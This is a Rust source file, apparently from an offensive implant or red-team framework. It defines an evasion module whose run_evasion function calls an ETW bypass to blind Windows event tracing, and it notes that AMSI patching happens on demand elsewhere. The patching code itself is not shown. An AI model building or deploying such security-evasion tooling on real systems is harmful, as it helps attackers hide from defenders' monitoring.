use std::ffi::c_void;

use shared_no_std::export_resolver;
use shared_no_std::export_resolver::ExportResolveError;
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

use crate::{
    evasion::etw::etw_bypass,
    utils::console::{print_failed, print_info},
};

pub mod amsi;
mod etw;

pub fn run_evasion() {
    //
    // Note these functions are feature gated on the inside of their calls so dont worry about that :)
    //

    etw_bypass();

    //
    // Note we do not try patch AMSI here, that should be done on demand in the process when required. AMSI is loaded as
    // amsi.dll.
    //
}
